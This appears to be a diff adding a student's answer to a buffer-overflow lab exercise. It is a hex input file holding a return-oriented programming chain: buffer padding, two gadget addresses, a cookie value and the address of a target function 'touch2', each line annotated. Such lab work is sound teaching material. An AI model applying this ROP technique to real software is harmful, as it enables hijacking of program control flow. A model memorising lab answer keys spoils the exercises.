@@ -1,0 +1,11 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 56 (buffer size) padding */
+cc 1d 40 00 00 00 00 00 /* gadget 1: popq %rax address starts at last byte 401dc9 + 3 = 401dcc */
+0b 76 53 5e 00 00 00 00 /* cookie string of 5e53760b (5 ascii = 35 hex) */
+d3 1d 40 00 00 00 00 00 /* gadget 2: movq %rax, %rdi 401dd0 +3 */
+3c 1c 40 00 00 00 00 00 /* address of touch2 (see asm2) */
